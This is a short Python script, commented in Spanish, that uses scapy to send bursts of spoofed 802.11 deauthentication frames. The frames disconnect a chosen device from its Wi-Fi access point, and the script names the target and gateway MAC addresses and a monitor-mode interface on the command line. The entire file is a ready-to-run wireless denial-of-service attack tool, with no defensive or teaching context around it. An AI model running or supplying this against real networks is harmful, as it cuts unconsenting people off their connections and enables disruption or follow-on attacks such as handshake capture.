import argparse
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth(target_mac, gateway_mac, iface):
    # Crear la cabecera 802.11 con la dirección MAC del dispositivo y del router
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # Crear el paquete de desautenticación
    paquete = RadioTap()/dot11/Dot11Deauth(reason=7)
    # Enviar el paquete en bucle
    sendp(paquete, inter=0.1, count=100, iface=iface, verbose=1)

if __name__ == "__main__":
    # Configurar argparse para recibir los argumentos
    parser = argparse.ArgumentParser(description="Realizar un ataque de desautenticación a un dispositivo en la red.")
    
    parser.add_argument("target_mac", help="Dirección MAC del dispositivo objetivo.")
    parser.add_argument("gateway_mac", help="Dirección MAC del router o punto de acceso.")
    parser.add_argument("iface", help="Interfaz de red en modo monitor.")
    
    args = parser.parse_args()
    
    # Ejecutar el ataque con los valores proporcionados
    deauth(args.target_mac, args.gateway_mac, args.iface)
